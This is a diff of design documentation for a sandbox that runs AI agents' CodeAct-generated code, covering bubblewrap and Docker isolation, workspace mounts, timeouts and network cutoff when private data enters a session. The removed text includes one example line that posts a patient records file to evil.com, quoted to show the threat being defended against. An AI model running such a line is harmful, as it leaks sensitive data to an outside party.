@@ -1,489 +1,203 @@
-## MCP Sandbox Overview
+## Code Sandbox
 
-MCP Sandbox is an implementation of CodeAct. Itprovides secure, isolated execution environments for running arbitrary code through Docker containers. The system manages concurrent multi-tenant sessions, each with dedicated containers and filesystems, while ensuring resource isolation, failure recovery, and operational observability.
+When agents use the CodeAct pattern -- generating and executing arbitrary code to accomplish tasks -- they need an execution environment that is isolated, recoverable, and auditable. A sandbox provides this environment. It sits between the agent and the host operating system, enforcing boundaries that the agent's code cannot circumvent.
 
-## Core Architecture
+This section describes the concepts and mechanisms behind sandboxed execution. The sandbox is a library-level abstraction: it provides the building blocks that higher-level systems (MCP servers, API services, CLI tools) compose into complete execution environments.
 
-### Multi-Tenant Session Model
+## Why Agents Need Sandboxes
 
-The architecture implements strict session isolation where each user session operates in a dedicated container with its own filesystem. Sessions are identified by a composite key (`user_id:session_id`), enabling multiple concurrent sessions per user while maintaining complete isolation.
+Tool-based agents operate within a controlled vocabulary: each tool has defined inputs, outputs, and permissions (see the `@tool_permission` decorator in our tools module). But CodeAct agents write and run arbitrary code. A Python snippet can open files, make network requests, spawn processes, or modify the filesystem in ways that no tool permission system can anticipate.
 
-**Key Design Decisions**:
-- Composite session keys provide natural multi-tenancy without complex access control
-- One-to-one mapping between sessions and containers simplifies lifecycle management
-- Session state machines (CREATING → RUNNING → STOPPED/ERROR) enable predictable state transitions
-- Activity tracking with configurable timeouts enables automatic resource reclamation
+The sandbox addresses this by enforcing isolation at the infrastructure level. Rather than trying to restrict what code can do through static analysis or allow-lists (which are brittle and bypassable), the sandbox constrains the environment in which the code runs.
 
-**Trade-offs**:
-- Each session requires a full container (higher resource usage vs. simpler isolation)
-- Container startup latency on first request (mitigated by lazy creation pattern)
-- Resource overhead acceptable for strong isolation guarantees
+## Process Isolation
 
-### Data Isolation Through Filesystem Namespacing
+The fundamental mechanism is process isolation: executing the agent's code in a separate process with restricted access to the host system.
 
-Each session's data resides in a host directory mounted into the container at a fixed path. This design provides filesystem isolation while enabling data persistence across container lifecycles.
+### Lightweight Isolation: Bubblewrap
 
-**Directory Hierarchy**:
-```
-{base_data_dir}/
-  `-- {user_id}/
-      `-- {session_id}/
-          `-- [session data]
-```
-
-**Benefits**:
-- Physical isolation at filesystem level prevents cross-session access
-- Data persists when containers are recreated after failures
-- Path translation layer (`to_host_path`/`to_container_path`) abstracts storage details
-- Supports both bind mounts (local development) and named volumes (production)
-
-**Path Translation Pattern**:
-- Container paths are fixed (`/workspace`) for consistency
-- Host paths computed from session context (`user_id`, `session_id`)
-- Translation happens at the boundary between application and container layers
-- Volume subpaths enable multi-tenancy on shared storage
-
-### Lifecycle Management with Health Monitoring
-
-Containers follow a managed lifecycle with verification at each stage and continuous health monitoring to detect failures.
-
-**Startup Verification**:
-- Containers must achieve sustained "running" state (multiple consecutive checks)
-- Prevents race conditions where containers briefly appear running before crashing
-- Startup failures captured with diagnostic logs for debugging
-- Fast-fail approach: Reject containers that cannot reach stable state
-
-**Continuous Health Monitoring**:
-- Background thread periodically checks all tracked containers
-- Detects external failures: manual stops, crashes, OOM kills, removals
-- Handler pattern enables reactive responses to failures
-- Polling interval trades detection latency vs. system load
-
-**Automatic Cleanup**:
-- Age-based cleanup removes old containers automatically
-- Prevents resource accumulation from abandoned sessions
-- Force cleanup on startup handles unclean shutdowns
-- Port resources released synchronously with container removal
-
-### Multi-Level Failure Detection
-
-The system implements defense-in-depth for failure detection, combining proactive monitoring with reactive validation.
-
-**Detection Layers**:
-
-1. **Proactive Layer** (Health Monitoring):
-   - Periodic background polling of all containers
-   - Detects failures even when system is idle
-   - Marks affected sessions for automatic recovery
-
-2. **Reactive Layer** (Pre-Use Validation):
-   - Status check before every operation
-   - Catches failures between monitoring intervals
-   - Ensures container validity immediately before use
-
-3. **Recovery Layer** (Automatic Recreation):
-   - Sessions marked ERROR automatically recreated on next use
-   - Transparent to clients (idempotent operations)
-   - Data preserved through persistent storage
-
-**Failure Flow**:
-```
-External Failure
-    ↓
-Health Monitor Detection
-    ↓
-Session Marked ERROR
-    ↓
-Client Next Request
-    ↓
-Pre-Use Validation
-    ↓
-Container Recreated
-    ↓
-Operation Proceeds
-```
-
-This layered approach provides maximum detection latency of one monitoring interval while ensuring operations never proceed on failed containers.
-
-### Concurrency Model
-
-The system uses multi-threaded background processing with careful synchronization to handle concurrent operations safely.
-
-**Thread Categories**:
-- **Lifecycle Threads**: Container cleanup, session expiration
-- **Monitoring Threads**: Health checks, service status monitoring
-- **Execution Threads**: Command execution with timeout enforcement
-
-**Synchronization Strategy**:
-- Fine-grained locks protect shared data structures
-- Copy-before-iterate pattern prevents modification-during-iteration
-- All background threads are daemon threads (clean shutdown)
-- Lock-free reads where possible through immutable snapshots
-
-**Command Execution Isolation**:
-- Each command execution runs in isolated process
-- Timeout enforcement through process termination
-- Inter-process communication via queues (not shared memory)
-- Graceful degradation: SIGTERM → SIGKILL escalation
-
-**Race Condition Prevention**:
-- Sustained state checks (multiple consecutive reads) for critical transitions
-- Activity updates before status checks (establishes happens-before relationships)
-- Atomic state transitions through lock-protected modifications
-- No assumptions about operation ordering across threads
-
-### Service Management Architecture
-
-Long-running processes (web servers, databases) require different lifecycle management than one-off commands. The service subsystem addresses this with background process management and health monitoring.
-
-**Background Execution Pattern**:
-- Services started via `nohup` with output redirection
-- PID captured and tracked for lifecycle operations
-- Process monitoring through PID checks, not container status
-- Exit code captured for post-mortem analysis
-
-**Monitoring Strategy**:
-- Per-session service monitor with dedicated thread
-- Periodic process existence checks via PID
-- Port detection through `lsof` (dynamic port discovery)
-- Status updates don't affect session activity (read-only monitoring)
-
-**Service State Machine**:
-```
-STARTING → RUNNING → STOPPED (graceful)
-                   → FAILED (error exit)
-                   → STOPPING → STOPPED (manual stop)
-```
-
-**Lifecycle Operations**:
-- **Start**: Generate script, execute with nohup, capture PID
-- **Monitor**: Check PID, update ports, detect failures
-- **Stop**: Graceful SIGTERM, wait, force SIGKILL if needed, fallback to pattern kill
-- **Logs**: Tail stdout/stderr files, queryable by clients
-
-**Design Rationale**:
-- Services don't allocate specific ports (container has pre-allocated pool)
-- System detects actual ports post-startup (flexible port binding)
-- Services cleared on container failure (stale state eliminated)
-- No automatic restart (client controls service lifecycle)
-
-### Resource Management
-
-**Port Allocation**:
-- Fixed pool of ports allocated per container at creation
-- Singleton port manager prevents double-allocation
-- Ports released when container removed (no leaks)
-- Services bind to any available port within allocation
-
-**Resource Limits**:
-- CPU quotas prevent CPU exhaustion
-- Memory limits prevent OOM on host
-- Configurable per-container via ContainerConfig
-- Limits enforced by container runtime
-
-**Port Management Pattern**:
-- Pre-allocation at container creation (not on-demand)
-- Fixed pool per container (predictable resource usage)
-- Container-scoped allocation (cleanup happens naturally)
-- Detection over configuration (discover actual ports post-startup)
-
-### Security Architecture
-
-**Defense-in-Depth Layers**:
-
-1. **Container Isolation**:
-   - Separate Linux namespaces per session
-   - Non-root execution (runs as dedicated user)
-   - Resource limits prevent DoS
-   - Filesystem isolation through mount namespaces
-
-2. **Network Security**:
-   - Configurable port binding (localhost vs. all interfaces)
-   - Optional proxy mode for restricted environments
-   - Port exhaustion prevention through fixed pools
-   - Service port range isolation
-
-3. **Execution Security**:
-   - Timeout enforcement prevents infinite loops
-   - Working directory restrictions
-   - Command execution through controlled interfaces
-   - Script generation with safe path handling
-
-4. **Access Control**:
-   - Session-based isolation (no cross-session access)
-   - Path translation prevents directory traversal
-   - Workspace-scoped file operations
-   - Session authentication at API boundary
-
-**Proxy Mode Design**:
-- Containers inherit parent's network configuration
-- Enables corporate proxy compliance
-- Maintains network isolation in restricted environments
-- Optional feature activated via configuration
-
-### Network Isolation with PrivateData
-
-The tool permission system (the `@tool_permission` decorator with `CONNECT` permission) prevents data exfiltration through PydanticAI tools, but it cannot reach code that runs inside a Docker container. When the agent uses the CodeAct pattern to execute arbitrary Python, it can bypass tool permissions entirely:
+On Linux, [bubblewrap](https://github.com/containers/bubblewrap) (`bwrap`) provides user-namespace-based isolation without requiring root privileges or a container runtime. It creates a minimal filesystem view by selectively bind-mounting only the paths the child process needs:
 
 ```python
-# This runs inside the container, outside the tool permission system
-import requests
-requests.post("https://evil.com", data=open("/workspace/patient_records.csv").read())
+class SandboxBubblewrap(Sandbox):
+    def _build_command(self, command, bind_mounts, isolate_network, isolate_pid, cwd):
+        cmd = [
+            "bwrap",
+            "--ro-bind", "/usr", "/usr",
+            "--ro-bind", "/lib", "/lib",
+            "--ro-bind", "/bin", "/bin",
+            "--proc", "/proc",
+            "--dev", "/dev",
+            "--tmpfs", "/tmp",
+        ]
+        # User-specified mounts
+        for mount in bind_mounts:
+            flag = "--ro-bind" if mount.readonly else "--bind"
+            cmd.extend([flag, str(mount.source), mount.target])
+        # Optional namespace isolation
+        if isolate_pid:
+            cmd.append("--unshare-pid")
+        if isolate_network:
+            cmd.append("--unshare-net")
+        ...
 ```
 
-The solution is infrastructure-level network isolation that the container cannot circumvent. Docker's `network_mode="none"` removes all network interfaces except loopback -- no sockets, no DNS, no tunneling. The sandbox ties this to the `PrivateData` compliance system so that network access is revoked automatically when sensitive data enters the session.
+The child process sees a read-only root filesystem, a private `/tmp`, and only the bind mounts explicitly granted. PID and network namespaces can be unshared independently. This is lightweight (no daemon, no images, no layers) and fast to start.
 
-**NetworkMode Selection**:
+### Fallback: Plain Subprocess
 
-A `NetworkMode` enum maps directly to Docker network configuration:
+On platforms without bwrap (macOS, Windows), a subprocess fallback runs the command directly. No isolation is provided -- this is a development convenience, not a security boundary. The factory function selects the appropriate implementation:
 
 ```python
-class NetworkMode(str, Enum):
-    FULL = "bridge"   # default Docker bridge networking
-    NONE = "none"     # loopback only, no external access
-
-def get_network_mode(user_id: str, session_id: str) -> NetworkMode:
-    if session_has_private_data(user_id, session_id):
-        return NetworkMode.NONE
-    return NetworkMode.FULL
+def get_sandbox() -> Sandbox:
+    if shutil.which("bwrap"):
+        return SandboxBubblewrap()
+    return SandboxSubprocess()
 ```
 
-The check is deliberately simple: if the session has private data, the container gets no network. There is no allow-list, no proxy, no partial access. The binary choice eliminates configuration errors and makes the security property easy to audit.
+### Heavyweight Isolation: Containers
 
-**Mid-Conversation Ratchet**:
+For production multi-tenant deployments, container runtimes (Docker, Podman) provide stronger isolation: separate filesystem layers, cgroup resource limits, full network namespace control, and seccomp profiles. Container-based sandboxes are heavier to start and manage, but offer guarantees that bwrap alone does not (CPU/memory limits, storage quotas, image-based reproducibility).
 
-A session may start without private data and acquire it later when a connector retrieves sensitive records. The `SandboxManager` checks `PrivateData` state on every `get_or_create_session()` call. If the session's current network mode no longer matches what `PrivateData` requires, the manager stops the existing container and creates a new one with network disabled:
+The sandbox abstraction accommodates both: the `Sandbox` ABC defines a uniform `run()` interface, and implementations range from "no isolation" through "user namespaces" to "full containers". The choice depends on the deployment context.
+
+## Filesystem Isolation
+
+The agent's code needs to read and write files, but it should only access its own workspace -- not the host filesystem, not other users' data.
+
+### Bind Mounts
+
+The sandbox exposes specific host directories to the child process through bind mounts. A `BindMount(source, target, readonly)` maps a host path to a path visible inside the sandbox:
 
 ```python
-def _ensure_network_mode(self, session: Session) -> None:
-    required = get_network_mode(session.user_id, session.session_id)
-    if session.network_mode == required:
-        return
-    if required == NetworkMode.NONE:
-        self._recreate_container(session)
+bind_mounts = [
+    BindMount(workspace_path, "/workspace"),           # read-write
+    BindMount(temp_dir, str(temp_dir)),                # IPC channel
+]
 ```
 
-This transition is a one-way ratchet: `FULL` to `NONE`, never the reverse. Once private data has entered the session, the network stays off for the remainder of the session's lifetime, mirroring the ratchet behavior in `PrivateData` itself where sensitivity escalates but never degrades.
+Inside the sandbox, the code sees `/workspace` as its working directory. It has no way to access paths outside the mounted directories.
 
-**Workspace Survival**:
+### Multi-Tenant Directory Layout
 
-Container recreation does not lose data. Each session's workspace lives on the host filesystem and is bind-mounted into the container at `/workspace`. When the old container is removed and a new one is created, the same host directory is mounted again. From the agent's perspective, all files are still present -- only the network has changed.
+When multiple users and sessions share a host, each session gets its own workspace directory:
+
+```
+{data_dir}/
+  {user_id}/
+    {session_id}/
+      [session files]
+```
+
+The sandbox mounts only the current session's directory. Physical separation at the filesystem level prevents cross-session access without relying on application-level checks.
+
+### Path Translation
+
+A translation layer converts between the agent-visible path (`/workspace/report.csv`) and the host path (`/data/users/alice/session-42/report.csv`). This happens at the boundary between the application and the sandbox -- the agent's code never sees host paths, and the host system never trusts agent-provided paths without translation and traversal checks.
+
+## Network Isolation
+
+Network access is the primary exfiltration vector for code running inside a sandbox. An agent that has loaded sensitive data into its workspace could POST it to an external server. Tool permissions cannot prevent this because the code runs outside the tool framework.
+
+### Binary Network Control
+
+The simplest and most auditable approach is a binary choice: the sandbox either has full network access or none at all. On bwrap, `--unshare-net` removes all network interfaces except loopback. On Docker, `network_mode="none"` does the same.
+
+There is no allow-list, no proxy, no partial access. This eliminates configuration errors and makes the security property trivial to verify.
+
+### Integration with Data Sensitivity
+
+The network isolation decision can be driven by data classification. When a session processes sensitive data (flagged by connectors via a compliance layer like `PrivateData`), the sandbox automatically disables network access:
 
 ```python
-volumes={str(session.data_dir): {"bind": "/workspace", "mode": "rw"}}
+isolate_network = session_has_private_data(user_id, session_id)
 ```
 
-This design means the container is a disposable execution environment: its lifecycle is independent from the data it operates on. The sandbox can recreate containers for network isolation, failure recovery, or configuration changes, and the workspace persists through all of these events.
+This is a one-way ratchet: once sensitive data enters a session, the network stays off for the session's lifetime. Sensitivity escalates but never degrades.
 
-**Integration with the Compliance Pipeline**:
+### Workspace Survival Across Recreation
 
-The full data protection pipeline works across three layers:
+If a running sandbox must be recreated to change its network mode (for example, when private data arrives mid-session), the workspace survives because it lives on the host filesystem. The old sandbox is destroyed, a new one is created with network disabled, and the same workspace directory is mounted again. From the agent's perspective, all files are still present -- only the network has changed.
 
-1. **Connectors** tag the session via `PrivateData.add_private_dataset()` when sensitive data enters
-2. **Tool permissions** block `CONNECT` tools through the `@tool_permission` decorator
-3. **Container network** blocks raw network access through `network_mode="none"`
+## Timeout Enforcement
 
-Layers 2 and 3 are independent enforcement points. Tool permissions prevent exfiltration through the agent's normal tool-calling path. Container network isolation prevents exfiltration through arbitrary code execution inside the sandbox. Together, they close both vectors without relying on the agent's cooperation.
+Agent-generated code can loop forever, deadlock, or simply take longer than acceptable. Reliable timeout enforcement requires process-level control -- you cannot reliably interrupt a thread executing arbitrary code.
 
-### Observability Design
+The sandbox starts the child process, then uses `asyncio.wait_for` with a timeout. If the timeout expires, the process is killed:
 
-Comprehensive structured logging enables debugging, auditing, and operational monitoring.
-
-**Log Categories**:
-- **System Logs**: Infrastructure events (container lifecycle, health monitoring)
-- **Command Logs**: Execution events with timing and results
-- **Code Logs**: Programming language execution with full context
-- **Service Logs**: Long-running process lifecycle and health
-
-**Log Enrichment Strategy**:
-- Context propagation: All logs include user_id, session_id, container_id
-- Timing information: Duration tracking for performance analysis
-- Error context: Stack traces, diagnostic output, pre-failure state
-- Correlation IDs: Trace requests across component boundaries
-
-**Structured Logging Benefits**:
-- Machine-readable format (JSON) enables automated analysis
-- Queryable by multiple dimensions (user, session, event type)
-- Consistent schema across all log types
-- Extensible through metadata fields
-
-**Operational Visibility**:
-- Container failures logged with diagnostic information
-- Service failures include stdout/stderr snapshots
-- Background thread errors logged without crashing threads
-- Health monitoring events tracked for trend analysis
-
-## Key Design Patterns
-
-### Lazy Initialization with Auto-Creation
-
-Resources created on first use rather than eagerly. Sessions and containers created when first accessed, not when user connects.
-
-**Benefits**:
-- Reduces resource consumption (only create what's needed)
-- Faster apparent response (no upfront cost)
-- Natural load distribution (creation spreads over time)
-
-**Implementation**: `ensure_container_available()` checks existence and creates if needed transparently to caller.
-
-### Handler Registration for Event Notification
-
-Components register callbacks with lifecycle managers to receive notifications about events (container failures, service crashes).
-
-**Benefits**:
-- Loose coupling between components
-- Easy to extend with new handlers
-- Event processing isolated from detection
-
-**Pattern**:
 ```python
-container_manager.register_external_failure_handler(
-    session_manager.handle_external_container_failure
-)
+try:
+    stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=timeout)
+    return SandboxResult(exit_code=process.returncode, stdout=stdout, stderr=stderr)
+except asyncio.TimeoutError:
+    process.kill()
+    await process.wait()
+    return SandboxResult(exit_code=-1, timed_out=True)
 ```
 
-### Copy-Before-Iterate for Thread Safety
+The calling code receives a `SandboxResult` with `timed_out=True` and can report the timeout to the agent without crashing the host process.
 
-Shared collections copied before iteration to avoid modification-during-iteration errors without holding locks during processing.
+## Inter-Process Communication
 
-**Pattern**:
+The sandbox runs code in a separate process. The calling code needs to send input (source code, namespace state) and receive output (results, stdout, stderr, figures). Two common patterns:
+
+### Pickle IPC
+
+The REPL module uses pickle-based IPC through the filesystem. The caller writes a pickle file to a temp directory, the sandbox mounts that directory, the executor reads input and writes output as pickle files:
+
 ```python
-with self.lock:
-    items_copy = list(self.items.values())
-# Process without lock
-for item in items_copy:
-    process(item)
+# Caller side
+(temp_dir / "input.pkl").write_bytes(pickle.dumps(input_data))
+result = await sandbox.run(command, bind_mounts=[BindMount(temp_dir, str(temp_dir))], ...)
+output = pickle.loads((temp_dir / "output.pkl").read_bytes())
 ```
 
-**Trade-offs**: Memory cost of copy vs. reduced lock contention.
+This works because the temp directory is bind-mounted into the sandbox, giving both sides access. The approach is simple and supports arbitrary Python objects (dataframes, figures, custom classes).
 
-### Singleton Pattern for Global Resources
+### Stdout/Stderr Capture
 
-Shared resources like PortManager use singleton pattern to ensure single source of truth.
+For simpler cases, the sandbox captures the child process's stdout and stderr as byte strings in `SandboxResult`. This suffices for commands that produce text output and where the only structured result is the exit code.
 
-**Rationale**: Port allocation must be globally coordinated to prevent conflicts.
+## Resource Limits
 
-**Implementation**: Module-level instance with accessor function.
+Beyond filesystem and network isolation, production sandboxes need resource limits to prevent a single session from exhausting host resources.
 
-### Base Class Pattern for Common Functionality
+**CPU and memory**: Container runtimes enforce these through cgroups. Bwrap does not manage cgroups, so resource limits require either a container runtime or external cgroup management.
 
-`BaseOperator` provides common functionality (session management, container checks, logging) to all operator types (shell, code, service).
+**Execution time**: Handled by the timeout mechanism described above.
 
-**Benefits**:
-- Code reuse across operator types
-- Consistent patterns for container access
-- Centralized session activity tracking
-- Uniform error handling
+**Storage**: Workspace directories can be placed on quota-managed filesystems or volume-limited container mounts.
 
-### Monitoring Pattern with Read-Only Operations
+**Process count**: PID namespace isolation (`--unshare-pid` in bwrap, default in containers) prevents fork bombs from affecting the host.
 
-Service monitoring reads status without updating session activity, preventing monitors from keeping sessions alive indefinitely.
+## Session Lifecycle
 
-**Key Distinction**:
-- User operations: Update session activity (keep alive)
-- Monitoring operations: Read-only (don't affect lifetime)
+In a multi-tenant system, sandboxes are tied to user sessions. The lifecycle follows a predictable pattern:
 
-**Implementation**: Separate code paths with `update_activity` flag.
+**Lazy creation**: The sandbox is not created when the user connects. It is created on first code execution, avoiding resource allocation for sessions that never run code.
 
-## Key Learnings and Best Practices
+**Activity tracking**: Each code execution updates a timestamp. Sessions that remain idle beyond a configurable timeout are eligible for cleanup.
 
-### Sustained State Verification
+**Failure recovery**: If a sandbox process crashes or is killed externally, the next execution attempt detects the failure and creates a new sandbox. The workspace persists through failures because it lives on the host filesystem, making the sandbox a disposable execution environment.
 
-Don't trust single status checks for critical state transitions. Container appearing "running" once doesn't guarantee stability.
+**Cleanup**: Background processes periodically remove expired sessions and their sandbox resources. Cleanup operations are defensive -- errors in cleaning one session do not prevent cleanup of others.
 
-**Solution**: Require multiple consecutive checks before considering state stable. Prevents race conditions where containers briefly appear running before crashing.
+## Security Layers
 
-### Separation of Detection and Recovery
+The sandbox is one layer in a defense-in-depth approach to agent security:
 
-Failure detection and recovery should be separate concerns handled at different layers.
+1. **Tool permissions** (`@tool_permission` with READ/WRITE/CONNECT) constrain what the agent can do through its normal tool-calling interface.
+2. **Sandbox isolation** constrains what the agent's generated code can do at the infrastructure level -- filesystem, network, process, and resource boundaries.
+3. **Data compliance** drives sandbox configuration automatically, tightening isolation when sensitive data enters a session.
 
-- Health monitoring detects failures and updates state
-- Request handling triggers recovery when needed
-- Separation enables testing each independently
+These layers are independent. Tool permissions cannot prevent code from making network requests inside a sandbox. Sandbox network isolation cannot prevent a tool from calling an external API. Together, they cover both vectors without relying on the agent's cooperation.
 
-### Activity-Based Lifecycle Management
+## Design Trade-offs
 
-Resources (sessions, containers) lifetime controlled by inactivity timeout rather than absolute TTL.
+**One sandbox per session** simplifies lifecycle management (no shared state, no cross-session interference) but costs more resources than pooling. For strong isolation, this trade-off is worthwhile.
 
-**Benefits**:
-- Active sessions never expire unexpectedly
-- Inactive resources reclaimed automatically
-- Activity tracking simple (update timestamp on use)
+**Binary network control** (full access or none) is less flexible than allow-lists or proxies, but eliminates configuration errors and is easy to audit.
 
-### Workspace Persistence Pattern
+**Pickle IPC** supports rich Python objects but introduces deserialization risks. The temp directory is short-lived and mounted read-write only for the duration of execution, limiting the attack surface.
 
-Separating workspace storage from container lifecycle enables transparent container recreation.
-
-- Data outlives containers
-- Failures recoverable without data loss
-- Container becomes disposable execution environment
-
-### Monitoring Without Side Effects
-
-Background monitoring must not affect system state (beyond updates to monitoring data).
-
-**Principle**: Monitoring checks status but doesn't trigger activity updates, session creation, or container recreation.
-
-**Rationale**: Prevents monitoring from keeping resources alive indefinitely.
-
-### Graceful Degradation in Cleanup
-
-Cleanup operations should never crash the cleanup process. Log errors but continue processing remaining items.
-
-**Pattern**:
-```python
-for item in items:
-    try:
-        cleanup(item)
-    except Exception as e:
-        log_error(e)  # Don't crash cleanup thread
-        continue
-```
-
-### Timeout Enforcement Through Process Isolation
-
-Reliable timeout enforcement requires process isolation. Cannot reliably interrupt thread executing user code.
-
-**Solution**: Execute commands in separate process, terminate process on timeout.
-
-### Pre-allocated Resource Pools
-
-Pre-allocate resources (ports) at container creation rather than on-demand.
-
-**Benefits**:
-- Predictable resource usage
-- Simpler allocation logic
-- Natural cleanup (resources released with container)
-- Prevents resource exhaustion from gradual leaks
-
-### State Machine Clarity
-
-Explicit state machines with well-defined transitions make system behavior predictable.
-
-**Examples**:
-- Container status: CREATING → RUNNING → STOPPED/ERROR
-- Service status: STARTING → RUNNING → STOPPED/FAILED
-- Session status tracks container status
-
-Clear states enable:
-- Predictable error handling
-- Simplified recovery logic
-- Better observability
-
-## Scalability Considerations
-
-**Current Design Limits**:
-- One container per session (1:1 ratio)
-- Background threads poll all tracked resources
-- Port pool size limits concurrent containers
-
-**Scaling Strategies**:
-- Horizontal: Multiple MCP server instances with load balancing
-- Vertical: Increase container resource limits
-- Port pools: Separate ranges per server instance
-- Monitoring: Migrate to event-based model for large container counts
-
-**Trade-offs Accepted**:
-- Polling overhead acceptable for hundreds of containers
-- One container per session provides strongest isolation
-- Port pre-allocation wastes some resources for predictability
+**Subprocess fallback** provides no isolation on non-Linux platforms. This is acceptable for development but must not be used in production with untrusted code.
